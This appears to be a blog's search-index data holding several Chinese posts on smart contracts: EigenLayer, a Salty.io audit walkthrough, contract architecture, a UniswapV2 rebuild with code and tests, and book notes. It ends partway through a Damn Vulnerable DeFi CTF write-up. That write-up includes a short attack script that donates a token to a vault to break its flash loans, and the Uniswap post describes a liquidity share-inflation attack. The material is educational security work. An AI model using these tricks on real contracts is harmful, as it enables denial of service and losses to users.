Podpod与strategy是同级的，区别是strategy进行的是流动性代币质押，而pod是进行原生质押，直接调用质押合约 主网及goerli的pos质押合约 Ethereum DepositContract Goerli DepositContract ","date":"2024-02-05","objectID":"/eigenlayer-analysis/:3:0","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#pod"},{"categories":["Defi"],"content":" EigenPod \u0026 EigenPodManager createPod：使用create2部署pod合约，记录ownerToPod stake：调用自己为owner的pod的stake方法 recordBeaconChainETHBalanceUpdate removeShares：减少shares addShares：增加shares withdrawSharesAsTokens：取回指定数目的eth ","date":"2024-02-05","objectID":"/eigenlayer-analysis/:3:1","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#eigenpod--eigenpodmanager"},{"categories":["book"],"content":" 完整的笔记和高亮见 ClearThinking ","date":"2024-01-31","objectID":"/clear-thinking/:0:0","series":null,"tags":null,"title":"Clear thinking 读书笔记","uri":"/clear-thinking/#"},{"categories":["book"],"content":" Keynote我们看过听过很多人很多书在尝试教我们如何去工作，如何学习，如何去做决策，如果把这些能力更加抽象概括的话，那就是思考的能力，这本书说的不只是如何思考，更是如何让你进入思考的状态，如何更清晰理性的思考 你能想起上次深思熟虑得出的结果吗？还是每次都脱口而出，按习惯去反应？在遇到困难时，你有去思考的意识吗，知道如何去思考吗？正如文中所说： Most books about thinking focus only on being more rational. They miss the fundamental problem: Most errors in judgment happen when we don’t know we’re supposed to be exercising judgment. 大多数关于思维的书籍都只关注于变得更理性，它们忽略了一个根本问题：大多数判断错误发生在我们不知道自己应该进行判断的时候。 这本书可以分为两部分，为思考创造空间+如何更加清晰的思考，创造空间部分给了我很多之前从没想到过的视角，作者分析了集中潜在的力量阻碍了我们去思考，我们需要首先认识出自己身上存在的默认设置，日常的思考是在没有理性分析下的默认反应。 在这些反应的时刻，我们被生物学上的“大脑”占据着，我们没有意识到去用自己理性的“大脑”来分析做决策。 这种生物本能无时无刻不在影响我们，他保护着我们但也妨碍我们，可以理解为我们大脑的”默认出厂设置“，主要分为四部分： 情绪默认：对情绪做出反应，而不是基于事实思考 自我默认：不惜一切保护自我价值自我地位，也就是个人的ego，自我“正确”比事实“正确”更重要，关注自尊心而不是结果 社会默认：自古而来遵守社会的规范，开启大脑的自动驾驶模式，害怕成为局外人，失去“社会资本” 惯性默认：抵制变化，维持现状，害怕变化会比现在更糟，我们希望保持自己的一致性而不是有效性 后文在讲解如何提升自己，管理弱点，如何做决策时都有很详细的描述，这里列举一些让我印象深刻的点： 了解自己的边界，自己的优点缺点局限性，玩发挥自己优势的游戏 为弱点和坏习惯增大摩擦力 先定义问题，再解决问题 想出+1个选项，探索更多可能性 ","date":"2024-01-31","objectID":"/clear-thinking/:1:0","series":null,"tags":null,"title":"Clear thinking 读书笔记","uri":"/clear-thinking/#keynote"},{"categories":["book"],"content":" Highlight In order to get the results we desire, we must do two things. We must first create the space to reason in our thoughts, feelings, and actions; and second, we must deliberately use that space to think clearly. Once you have mastered this \u003e skill, you will find you have an unstoppable advantage. 为了得到我们想要的结果，我们必须做两件事。我们必须首先创造思考、感受和行动的空间；其次，我们必须故意利用这个空间来清楚地思考。一旦你掌握了这个技能，你会发现你有一个不可阻挡的优势。 Why risk looking like an idiot when you can remain average? We’d rather be average than risk the possibility of landing somewhere below average. 当你可以保持平均水平时，为什么要冒着看起来像白痴的风险？我们宁愿保持平均水平，也不愿冒着低于平均水平的风险。 Strength is the power to press pause on your defaults and exercise good judgment.力量是按下暂停键的能力，是行使良好判断力的能力。 All the energy you put toward things you don’t control comes out of the energy you can put toward the things you can.你投入到你不能控制的事情上的所有能量，都来自于你可以投入到你能控制的事情上的能量。 The most valuable people, he continued, weren’t the ones with the best initial ideas, but the ones with the ability to quickly change their minds. They were focused on outcome over ego.最有价值的人不是那些拥有最佳初始想法的人，而是那些有能力快速改变自己想法的人。他们关注的是结果，而不是自我 The biggest mistake people make typically isn’t their initial mistake. It’s the mistake of trying to cover up and avoid responsibility for it. The first mistake is expensive; the second one costs a fortune. 人们通常犯的最大错误不是最初的错误，而是试图掩盖和逃避责任的错误。第一个错误是昂贵的；第二个错误代价高昂。 if you choose not to decide, you still have made a choice. 如果你选择不决定，你仍然做出了选择。 Ludwig Wittgenstein sums up this idea: “To understand is to know what to do.”哲学家路德维希·维特根斯坦（Ludwig Wittgenstein）的这句名言经常被引用来总结这个想法：“理解就是知道该做什么。” A lot of the information we consume is in the form of highlights, summaries, or distillations. It’s the illusion of knowledge. We learn the answer but can’t show our work. 我们消费的很多信息都是摘要、总结或提炼的形式。这是知识的幻觉。我们学会了答案，但不能展示我们的工作。 Another big reason we find action hard is that we’re afraid of being wrong. In this case inertia holds us in place as we gather more and more information in the false hope that we can ultimately eliminate uncertainty. 我们发现采取行动很难的另一个重要原因是，我们害怕犯错。在这种情况下，惯性将我们困在原地，因为我们在虚假的希望中收集越来越多的信息，希望最终消除不确定性。 Keep a record of your thoughts at the time you make the decision. Don’t rely on your memory after the fact. Trying to recall what you knew and thought at the time you made the decision is a fool’s game. 在你做出决定时， 记录下你的想法。不要依赖事后的记忆。试图回忆你在做出决定时所知和所想是一个愚蠢的游戏。 Running on the hedonic treadmill only turns us into what I call “happy-when” people—those who think they’ll be happy when something happens.在快乐跑步机上跑步只会把我们变成我称之为“快乐-当”的人——那些认为当某些事情发生时，他们会感到快乐的人。 Most books about thinking focus only on being more rational. They miss the fundamental problem: Most errors in judgment happen when we don’t know we’re supposed to be exercising judgment.大多数关于思维的书籍都只关注于变得更理性，它们忽略了一个根本问题：大多数判断错误发生在我们不知道自己应该进行判断的时候。 ","date":"2024-01-31","objectID":"/clear-thinking/:2:0","series":null,"tags":null,"title":"Clear thinking 读书笔记","uri":"/clear-thinking/#highlight"},{"categories":["audit"],"content":" Github: https://github.com/code-423n4/2024-01-salty Documentation: https://tech.salty.io/ ","date":"2024-01-24","objectID":"/salty/:0:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#"},{"categories":["audit"],"content":" Overview主要分为几个模块： AMM：涉及pool底层swap及arbitrage DAO：涉及proposal rewards liquidity分配处理 Stable：利用lp的底层资产实现的稳定币机制 Stake：抵押salt获得xsalt Rewards：利润分红模块 Lauch：启动空投 激励模块 ","date":"2024-01-24","objectID":"/salty/:1:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#overview"},{"categories":["audit"],"content":" 启动相关逻辑位于Lauch目录 链下权限校验通过的用户可以提交签名来投票，等投票结果 投票通过后触发salt的分配 52m→emissions 25m→dao 10m→dev 5m→airdrop 5m→lp rewards 3m→stake rewards ","date":"2024-01-24","objectID":"/salty/:2:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#启动"},{"categories":["audit"],"content":" LP相关逻辑位于Stable目录 负责提供抵押物池的collateral LP： depositCollateralAndIncreaseShare：转入wbtc weth获得shares withdrawCollateralAndClaim：提取流动性，拿回wbtc weth borrowUSDS：根据shares作为抵押物，mint出usds repayUSDS：偿还usds，把收到的usds发到liquidizer合约，负责销毁 由于存在杠杆，lp的借贷可以被清算： liquidateUser：移除被清算人的流动性，移除份额shares 取回的wbtc weth按比例分红给清算人和liquidizer 把用户借出的usds全部给liquidizer 其他whitelist pool的lp： depositLiquidityAndIncreaseShare：转入token a b获得shares withdrawLiquidityAndClaim：提取流动性，拿回token a b ","date":"2024-01-24","objectID":"/salty/:3:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#lp"},{"categories":["audit"],"content":" Staker相关逻辑位于Staking目录 通过stakeSALT来质押salt，获取份额shares unstake 取消质押，减掉份额 recoverSALT取回质押的salt ","date":"2024-01-24","objectID":"/salty/:4:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#staker"},{"categories":["audit"],"content":" Trader相关逻辑位于AMM目录 可以通过deposit和withdrawt，提前预存款在合约内用于swap 通过swap，depositSwapWithdraw，depositDoubleSwapWithdraw进行swap swap过程中分析是否存在套利利润，如果有则自动执行，并将利润更新到dao的账上 ","date":"2024-01-24","objectID":"/salty/:5:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#trader"},{"categories":["audit"],"content":" DAO相关逻辑位于DAO目录 首先是提案权力： 分几类：修改协议参数，控制代币白名单，地域黑名单，salt的分配，合约的调用，修改网站信息等 什么人有权提案？ dao地址 是否持有足够的xSALT（质押salt所得） 议案流程 DAO提出议案 用户再对议案投票：质押得到多少shares就能对议案投多少票 若议案通过，可以调用finalizeBallot执行 除了议案投票，dao也在协议中持有流动性和分红 formPOL：由upkeep调用，向抵押物池子提供流动性，获得shares withdrawPOL：由liquidizer调用，按照比例提取流动性，再将所得发送到liquidizer withdrawArbitrageProfits：由upkeep调用，提取出套利利润，再发送给upkeep processRewardsFromPOL：由upkeep调用 从usds/salt usds/dai两个池子中获取分红，转移10%salt给团队，剩下的50%发送到usds合约burn掉 ","date":"2024-01-24","objectID":"/salty/:6:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#dao"},{"categories":["audit"],"content":" Rewardreward的链路源头是upkeep合约，任何人调用upkeep，串联起内部所有的奖励分发逻辑，相关逻辑位于Reward 调用liquidizer，执行performUpkeep liquidizer把合约内的其他资产都swap成usds，把salt burn掉 liquidizer会把usdsThatShouldBeBurned尽可能burn掉，如果当前资产不够burn 调用dao的withdrawPOL，从dao获取salt和usds 调用dao的withdrawArbitrageProfits，提取套利利润 把默认5%的利润发给调用者 操作合约内的5% weth 将各一半的weth去swap出usds和dai 把换出来的usds和dai都发送到dao 调用dao的formPOL，由dao提供流动性 操作合约内的20%weth 将各一半的weth去swap出usds和salt 把换出来的usds和salt都发送到dao 调用dao的formPOL，由dao提供流动性 将合约内的全部weth swap成salt，转移到saltRewards合约 计算距离上次调用间隔多久，调用emissions.performUpkeep emissions根据间隔线性计算发送多少salt到saltRewards 获取当前所有池的套利收入和白名单列表 调用saltRewards的performUpkeep 先按照比例计算多少salt直接发到salt/usds池子 剩余部分按比例，调用stakingRewardsEmitter.addSALTRewards 发送到emitter合约 记录pool及对应的pending reward 剩余部分等分salt，其中saltUSDSPoolID可以多算一笔，调用到liquidityRewardsEmitter.addSALTRewards 调用stake和liquidity emitter的performUpkeep方法，传入间隔时间 处理pendingreward，线性释放，调用stakingRewards.addSALTRewards 把salt转移到stakingRewards合约，累加每个pool的rewards 调用dao的processRewardsFromPOL，由dao来提取分红 从dao的vesting钱包转移salt到dao（线性释放） 从团队的vesting钱包转移salt到团队钱包（线性释放） ","date":"2024-01-24","objectID":"/salty/:7:0","series":null,"tags":null,"title":"Salty WalkThrough","uri":"/salty/#reward"},{"categories":["system design"],"content":" 在阅读OlympusV3的合约时，架构的设计给我留下很深的印象，架构清晰，在智能合约领域实现了高内聚低耦合的设计思想，从而可以专注的深入独立的模块阅读，降低了心智负担。 OlympusV3的架构图如下所示： 后来了解到这种框架也并非Olympus独创，在Olympus介绍合约架构的文章中提到了Default框架 ","date":"2024-01-09","objectID":"/the-default-framework/:0:0","series":null,"tags":null,"title":"智能合约架构--The Default Framework","uri":"/the-default-framework/#"},{"categories":["system design"],"content":" 智能合约架构的复杂性在介绍Default框架之前，作者首先对比了传统的协议如AAVE MakerDAO的架构图 光看架构图，开发者是很难厘清其中的调用链路的，作者将这种设计解释为以过程为中心，按照逻辑链的思路来组织 Today, most projects take a process-centric approach towards protocol development: each smart contract is developed to manage a process along a chain of logic that is triggered when external interactions occur. 那么随着业务的升级和更替，逻辑链路的复杂度会指数级增长，原因在于整个协议呈现网状架构，或许每两个点之间都有逻辑链，那么每增添一个点，带来的复杂度提升是难以估量和覆盖的。 正如软件工程领域的设计模式演进过程一样，智能合约的工程化架构也在不断改进，Default Framework正是着手解决这个问题 ","date":"2024-01-09","objectID":"/the-default-framework/:1:0","series":null,"tags":null,"title":"智能合约架构--The Default Framework","uri":"/the-default-framework/#智能合约架构的复杂性"},{"categories":["system design"],"content":" 什么是The Default Framework光从名字看不出来设计的思路，不像Diamond框架能够让人产生联想。The Default Framework也没有做特别的创新，而是借鉴了传统领域开发的设计思想，对整个合约进行了分层 Modules：面向内部，模块可以理解为微服务，每个模块管理一部分数据，彼此之间不存在依赖关系，高度独立，对于模块的访问都到权限管理约束 Policy：面向外部调用，在内部负责组织不同的模块以实现业务逻辑 核心的管理逻辑都收口在Kernal.sol文件中，负责管控全局的Policy和Modules ","date":"2024-01-09","objectID":"/the-default-framework/:2:0","series":null,"tags":null,"title":"智能合约架构--The Default Framework","uri":"/the-default-framework/#什么是the-default-framework"},{"categories":["system design"],"content":" Modules每个Modules包括独一无二的KEYCODE及VERSION，在定义Modules时需要实现此方法，在Kernal中会维护所有的keycode及其与Module的映射关系 在Kernal中包括以下方法 _installModule：安装module _upgradeModule：升级module 示例： solidity /// @inheritdoc Module function KEYCODE() public pure override returns (Keycode) { return toKeycode(\"MINTR\"); } /// @inheritdoc Module function VERSION() external pure override returns (uint8 major, uint8 minor) { major = 1; minor = 0; } ","date":"2024-01-09","objectID":"/the-default-framework/:2:1","series":null,"tags":null,"title":"智能合约架构--The Default Framework","uri":"/the-default-framework/#modules"},{"categories":["system design"],"content":" PolicyPolicy可以理解为传统软件开发的service层，用来组织一系列Modules，包括以下方法： configureDependencies：返回支持哪些Modules requestPermissions：返回支持的Modules的具体函数selector 在kernal中包括以下方法： _activatePolicy _deactivatePolicy 示例： solidity /// @inheritdoc Policy function configureDependencies() external override returns (Keycode[] memory dependencies) { dependencies = new Keycode[](3); dependencies[0] = toKeycode(\"MINTR\"); dependencies[1] = toKeycode(\"TRSRY\"); dependencies[2] = toKeycode(\"ROLES\"); MINTR = MINTRv1(getModuleAddress(dependencies[0])); TRSRY = TRSRYv1(getModuleAddress(dependencies[1])); ROLES = ROLESv1(getModuleAddress(dependencies[2])); (uint8 TRSRY_MAJOR, ) = TRSRY.VERSION(); (uint8 MINTR_MAJOR, ) = MINTR.VERSION(); (uint8 ROLES_MAJOR, ) = ROLES.VERSION(); // Ensure Modules are using the expected major version. // Modules should be sorted in alphabetical order. bytes memory expected = abi.encode([1, 1, 1]); if (MINTR_MAJOR != 1 || ROLES_MAJOR != 1 || TRSRY_MAJOR != 1) revert Policy_WrongModuleVersion(expected); } /// @inheritdoc Policy function requestPermissions() external view override returns (Permissions[] memory requests) { Keycode MINTR_KEYCODE = MINTR.KEYCODE(); requests = new Permissions[](4); requests[0] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector); requests[1] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector); requests[2] = Permissions(MINTR_KEYCODE, MINTR.increaseMintApproval.selector); requests[3] = Permissions(MINTR_KEYCODE, MINTR.decreaseMintApproval.selector); } ","date":"2024-01-09","objectID":"/the-default-framework/:2:2","series":null,"tags":null,"title":"智能合约架构--The Default Framework","uri":"/the-default-framework/#policy"},{"categories":["Defi"],"content":" Part-1 流动性 UniswapV2相较于V1有了较大变动，也是目前最流行的dex版本，很多协议都是从UniswapV2 fork而来，在本系列的文章中，将使用Foundry作为合约的测试框架，使用solmate而非OpenZeppelin作为底层协议如ERC20的实现，将uniswap的核心框架代码从零到一进行复现。 UniswapV2的代码库分为core和periphery两部分，core包括： UniswapV2ERC20：用于lp代币的ERC20拓展 UniswapV2Factory：工厂合约，用于管理交易对 UniswapV2Pair：核心的交易对合约 periphery主要包括的合约是UniswapV2Router和UniswapV2Library，是重要的辅助交易合约 ","date":"2023-12-04","objectID":"/uniswapv2/:1:0","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#part-1-流动性"},{"categories":["Defi"],"content":" 添加流动性先从核心的添加流动性入手，uniswap在设计上与v1类似，交易者，lp，用户仍然是协议的核心参与者。与v1相比，v2的代码设计有所差异，lp注入流动性分为两部分，底层的实现是UniswapV2Pair合约，上层的入口在UniswapV2Router合约，在此我们先关注底层的实现。 添加流动性：即LP向交易对合约内按照一定比例转入两个底层资产，交易对为其按照投入的资产铸造出相应数量的流动性代币的过程。 作为UniswapV2Pair底层，这里需要实现的功能就是：计算用户投入多少底层资产，计算出相应额度的lp代币再mint给用户 solidity function mint() public { uint256 balance0 = IERC20(token0).balanceOf(address(this)); uint256 balance1 = IERC20(token1).balanceOf(address(this)); uint256 amount0 = balance0 - reserve0; uint256 amount1 = balance1 - reserve1; // 计算出本次用户投入的资产数量amount0和amount1 uint256 liquidity; // 区分是否是首次mint，流动性代币的计算方式不同 if (totalSupply == 0) { liquidity = ??? _mint(address(0), MINIMUM_LIQUIDITY); } else { liquidity = ??? } if (liquidity \u003c= 0) revert InsufficientLiquidityMinted(); // mint流动性代币 _mint(msg.sender, liquidity); // 更新交易对内储备量缓存 _update(balance0, balance1); emit Mint(msg.sender, amount0, amount1); } 从代码中可以看出，这里的交易对会通过reserve0和reserve1两个变量来缓存当前交易对中两个token的数量，而不是直接使用balanceOf来计数（注：这里也是为了合约安全起见，避免被外部操控） 在调用mint 方法前，用户应该按照预期向当前合约转入token0和token1，这里再计算当前合约内的token余额balance0 和balance1 ，减去之前的缓存，得到的amount0和amount1 就是本次用户转入的token数量 在计算应该铸造出多少个lp代币时会区分totalSupply是否为0，即当前是否是初次提供流动性，假设当前交易对内的token情况如下所示： token0 token1 liquidity reserve0 reserve1 totalSupply amount0 amount1 totalSupply+lp 按照固定的比例，本次待铸造的lp代币数目来源有两个，用户投入的两个token都可以作为基准来计算本次铸造的流动性代币 amount0/totalSupply*reserve0 amount1/totalSupply*reserve1 在实际开发中，UniswapV2的规则是选择两者中较小的那个，按照规定，用户提供的流动性是严格按照比例来的，两个值应该相等，但是若用户提供不平衡的流动性，这两个值就存在差异，如果协议按照大的来计算lp，那么相当于是对这种方式的鼓励，因此选择较小的流动性代币数目作为对用户的惩罚 回到totalSupply=0的条件分支，无法按照统一的比例计算lp代币数量，uniswapV2选择的是计算amount0*amount1的根号值，并且会统一减去MINIMUM_LIQUIDITY（1000）。 假设某lp初次投入token0和token1各1 wei，如果不减去MINIMUM_LIQUIDITY，则会mint出1 枚lp代币，然后再直接转入1000枚token0和token1，则此时交易对内有1000*10^18+1个token0和token1，但是只有1 wei的lp，那么对于后来的lp来说，即使只想提供最小单位的 1 wei 流动性，也要付出 2000 ether 的 token，解释参考 若统一减去MINIMUM_LIQUIDITY，则存在1000的流动性下限，用户可以不通过mint直接转入token，如果重新执行攻击流程，流动性单价最大值为(1001+2000×10^18)1001≈2×10^18，相较于前面已经降低很多，但是这里损失了首次流动性提供者的利益 整理后的代码如下： solidity if (totalSupply == 0) { liquidity = Math.sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY; _mint(address(0), MINIMUM_LIQUIDITY); } else { liquidity = Math.min( (amount0 * totalSupply) / _reserve0, (amount1 * totalSupply) / _reserve1 ); } 配套的测试代码： solidity function testInitialMint() public { vm.startPrank(lp); token0.transfer(address(pair),1 ether); token1.transfer(address(pair),1 ether); pair.mint(); uint256 lpToken = pair.balanceOf(lp); assertEq(lpToken, 1e18-1000); } function testExistLiquidity() public { testInitialMint(); vm.startPrank(lp); token0.transfer(address(pair),1 ether); token1.transfer(address(pair),1 ether); pair.mint(); uint256 lpToken = pair.balanceOf(lp); assertEq(lpToken, 2e18-1000); } function testUnbalancedLiquidity() public { testInitialMint(); vm.startPrank(lp); token0.transfer(address(pair),2 ether); token1.transfer(address(pair),1 ether); pair.mint(); uint256 lpToken = pair.balanceOf(lp); assertEq(lpToken, 2e18-1000); } ","date":"2023-12-04","objectID":"/uniswapv2/:1:1","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#添加流动性"},{"categories":["Defi"],"content":" 移除流动性从添加流动性的流程可以看出整体的流程是：用户转入底层资产token0和token1，mint出对应数目的lp代币 那么移除流动性就是逆向的过程，移除的前提是用户拥有lp代币，这里的lp代币就是用户提供流动性的凭证，具体的代码如下： 首先根据用户持有的lp数目，重新计算出他应得的amount0和amount1 将用户的全部lp代币销毁（可以看到这里暂不支持移除部分流动性） 将计算出的相应数目的token0和token1转移回用户 更新交易对内的资金储备量 solidity function burn() external{ uint256 balance0 = IERC20(token0).balanceOf(address(this)); uint256 balance1 = IERC20(token1).balanceOf(address(this)); uint256 liquidity = balanceOf[msg.sender]; // 计算用户的流动性占比的token数量 uint256 amount0 = liquidity * balance0 / totalSupply; uint256 amount1 = liquidity * balance1 / totalSupply; if (amount0 \u003c=0 || amount1 \u003c=0) revert InsufficientLiquidityBurned(); // 流动性代币burn _burn(msg.sender, liquidity); // 转移token回给用户 _safeTransfer(token0, msg.sender, amount0); _safeTransfer(token1, msg.sender, amount1); // 更新当前储备金 balance0 = IERC20(token0).balanceOf(address(this)); balance1 = IERC20(token1).balanceOf(address(this)); _update(balance0, balance1); emit Burn(msg.sender, amount0, amount1); } 测试代码如下： solidity function testBurn() public{ testInitialMint(); vm.startPrank(lp); pair.burn(); assertEq(pair.balanceOf(lp), 0); assertEq(token0.balanceOf(lp), 10 ether-1000); assertEq(token1.balanceOf(lp), 10 ether-1000); } function testUnbalancedBurn() public { testInitialMint(); vm.startPrank(lp); token0.transfer(address(pair),2 ether); token1.transfer(address(pair),1 ether); pair.mint(); uint256 lpToken = pair.balanceOf(lp); assertEq(lpToken, 2e18-1000); pair.burn(); assertEq(pair.balanceOf(lp), 0); assertEq(token0.balanceOf(lp), 10 ether-1500); assertEq(token1.balanceOf(lp), 10 ether-1000); } ","date":"2023-12-04","objectID":"/uniswapv2/:1:2","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#移除流动性"},{"categories":["Defi"],"content":" Part-2 预言机","date":"2023-12-04","objectID":"/uniswapv2/:2:0","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#part-2-预言机"},{"categories":["Defi"],"content":" 什么是价格Uniswap作为链上的去中心化交易所，承载着价值发现的功能，即用户或其他链上合约可以通过Uniswap来获取代币的价格，Uniswap在这其中承担链上预言机的功能。 假设当前交易池中有1 Ether和2000 USDC，那么以太币的价格就是2000/1=2000 USDC，反之就是USDC的价格，因此价格就是一个比率，由于智能合约尚不支持小数，所以在Uniswap的代码中拓展了新的数据类型来存储价格，关于新的数据类型后面会专门做介绍。 ","date":"2023-12-04","objectID":"/uniswapv2/:2:1","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#什么是价格"},{"categories":["Defi"],"content":" TWAP价格机制然而仅仅使用瞬时的代币数目之比作为价格是不安全的，存在人为操纵价格预言机的风险，由于Uniswap提供了闪电贷功能，因此在某个闪电贷交易的瞬间，交易对内的代币余额会产生剧烈波动。在UniswapV2中为了解决这个问题，采用了TWAP（Time Weighted Average Price）即时间加权的价格预言机机制。 具体工作原理如下： 假设过去一天，资产在前20个小时的价格为20$，最近4小时的价格为10$，那么TWAP=($20*20+10$*4)/24 = 18.33$ 假设过去一天，资产在第一个小时的价格为10$，最近23小时的价格为15$，那么TWAP=($10*1+15$*23)/24 = 14.79$ 总结下来，TWAP的公式如下，这里的T是时间段，P是对应时间段的价格 在UniswapV2的合约中，只会记录分子部分，即记录每个时间段乘以单价的求和，而分母部分则需要使用方自行维护，交易对内有两个代币，所有有两个值来记录 通常我们只需关心某一时间区间内的代币价格，这是TWAP公式的历史价格公式： 假设我们的计价从T4开始，那么实际的计价公式应该如下： 前面已经提到，在合约内有一个变量会追踪分子的求和值，以token0的追踪计价变量price0Cumulativelast为例： 这个变量是记录了历史以来所有时间段的求和，那么我们只需要从T4开始的部分即可，计算方式也很简单，在T3时间点我们获取一个price0Cumulativelast变量的快照，在最新即T6时间点再获取一次，两次的差值即是T4-最新时间段内token0的计价和 我们自己也维护了最近的窗口持续时间和，即：T4+T5+T6 那么这段时间内的TWAP价格即可计算得出：(price0Cumulativelast-UpToTime3)/(T4+T5+T6) ","date":"2023-12-04","objectID":"/uniswapv2/:2:2","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#twap价格机制"},{"categories":["Defi"],"content":" UniswapV2的实现具体到Uniswap的实现中，对于每个交易对都维护了两个变量price0Cumulativelast和price1Cumulativelast，在之前提到的_update 方法中进行求和，具体的代码如下： 首先获取当前的区块时间戳blockTimestamp 通过与blockTimestampLast相减，计算出距离上次更新过去了多少时间timeElapsed 只有在timeElapsed \u003e0时，即进入下一个区块时，才会累加价格*时间段 注意这里的价格计算用到了UQ112x112 的特殊格式，了解它是为了记录小数即可，后面会专门讲解这里的优化 在处理完累加后，才会更新blockTimestampLast 到最新的区块时间戳 solidity function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private { ... uint32 blockTimestamp = uint32(block.timestamp % 2**32); uint32 timeElapsed = blockTimestamp - blockTimestampLast; if (timeElapsed \u003e 0 \u0026\u0026 _reserve0 != 0 \u0026\u0026 _reserve1 != 0) { // * never overflows, and + overflow is desired price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed; price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed; } blockTimestampLast = blockTimestamp; ... } ","date":"2023-12-04","objectID":"/uniswapv2/:2:3","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#uniswapv2的实现"},{"categories":["Defi"],"content":" TWAP的潜在问题 基于时间加权的价格计算，会提高攻击者的操纵成本，因为需要连续控制多个区块，这样的攻击成本是很高的。 当价格产生剧烈波动时，由于有时间作为加权因素，预言机的价格无法在较短时间内反映出价格的波动，反而提供出过时的价格，尤其是在市场发生剧烈动荡时，这样的情况会导致Uniswap中的价格与外部市场产生较大的差异。 使用TWAP预言机仍然依赖链下的定时触发，存在维护成本与中心化问题。 ","date":"2023-12-04","objectID":"/uniswapv2/:2:4","series":null,"tags":null,"title":"从零开始UniswapV2","uri":"/uniswapv2/#twap的潜在问题"},{"categories":["audit"],"content":" Zach’s wall of achievements Overall issues found High risk Medium risk Low risk Audited contests 9 issues found 5 highs 2 medium 2 low 6 contests ","date":"2023-09-22","objectID":"/audit-profolio/:0:0","series":null,"tags":null,"title":"Audit Profolio","uri":"/audit-profolio/#zachs-wall-of-achievements"},{"categories":["audit"],"content":" Code4rena Contest High risk Medium risk Findings Leaderboard Kelp 1 H 101/185 NextGen 1 M 53/242 reNFT 1 H 80/115 Salty.io 1 H 144/177 ","date":"2023-09-22","objectID":"/audit-profolio/:1:0","series":null,"tags":null,"title":"Audit Profolio","uri":"/audit-profolio/#code4rena-img-srchttpscode4renacomlogosc4-logosvg-width100-height25"},{"categories":["audit"],"content":" CodeHawks Contest High risk Medium risk Low risk Findings Leaderboard Sparkn 1 2 Report 18/202 ","date":"2023-09-22","objectID":"/audit-profolio/:2:0","series":null,"tags":null,"title":"Audit Profolio","uri":"/audit-profolio/#codehawks-img-srchttpsrescloudinarycomdroqoz7lgimageuploadv1689080263snhkgvtsidryjdtx0pcepng-width50-height27"},{"categories":["audit"],"content":" Sherlock Contest High risk(Total) Medium risk Findings Leaderboard Allo V2 1 1 Report 14/115 ","date":"2023-09-22","objectID":"/audit-profolio/:3:0","series":null,"tags":null,"title":"Audit Profolio","uri":"/audit-profolio/#sherlock-img-srchttpspicimgdbcnitem654e6d2fc458853aef884667jpg-width24-height235"},{"categories":["CTF"],"content":" Challenge 1 - UnstoppableUnstoppable ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:1:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-1---unstoppable"},{"categories":["CTF"],"content":" 合约 ReceiverUnstoppable：继承IERC3156FlashBorrower合约，用于发起闪电贷，执行闪电贷后的回调 UnstoppableVault：金库合约，继承IERC3156FlashLender、ERC4626，支持闪电贷 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:1:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约"},{"categories":["CTF"],"content":" 脚本 依次部署DamnValuableToken、UnstoppableVault合约 存入TOKENS_IN_VAULT数量的token到金库中，转入player用户INITIAL_PLAYER_TOKEN_BALANCE数目的token 部署ReceiverUnstoppable合约 执行攻击脚本 期望ReceiverUnstoppable执行闪电贷的交易被revert ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:1:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#脚本"},{"categories":["CTF"],"content":" 题解攻击目标是使得通过ReceiverUnstoppable合约发起的executeFlashLoan方法被revert，首先分析executeFlashLoan的调用流程 重点在UnstoppableVault.flashLoan方法，分别会进行以下操作： 计算闪电贷开始前的余额：totalAssets() 计算当前的share：convertToShares(totalSupply)是否与前面计算出来的余额一致 计算闪电贷手续费：flashFee 转移amount个token到receiver，再调用receiver的onFlashLoan方法执行回调 从receiver方转回amount+fee数目的token 将fee转移给feeRecipient账户，完成本次闪电贷 若要使交易revert，关键的校验点在于使得：convertToShares(totalSupply) != totalAssets() 这两个函数都是ERC4626中的定义，关于此协议可参考下面的文章： WTF-Solidity/51_ERC4626/readme.md at main · WTFAcademy/WTF-Solidity 简单来说就是ERC20的组合：资产代币asset和份额代币share，存入资产或提取资产时都会相对应的铸造或销毁对应数目的share代币 totalAssets()：计算的是当前金库中的资产代币数目 convertToShares(totalSupply)：totalSupply是总的share代币数目（只有deposit或mint时才会产生），convertToShares就是计算：assets * totalSupply / totalAssets() 要想使得两者不一致，只要不通过depost或mint方法向UnstoppableVault中转入token即可，因此攻击脚本内容如下： javascript it('Execution', async function () { /** CODE YOUR SOLUTION HERE */ const dvtForPlayer = token.connect(player); await dvtForPlayer.transfer(vault.address,1); }); ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:1:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 